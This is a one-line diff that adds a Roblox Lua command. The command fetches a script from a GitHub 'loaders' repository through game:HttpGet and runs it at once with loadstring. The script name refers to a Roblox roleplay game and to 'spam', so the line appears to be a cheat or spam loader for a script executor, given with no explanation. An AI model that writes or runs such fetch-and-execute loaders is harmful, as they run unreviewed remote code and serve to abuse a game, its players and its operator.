@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/dreamville-rp-the-cat-in-the-hat-spam3-7sffpuhbmb2j5k.lua"))()
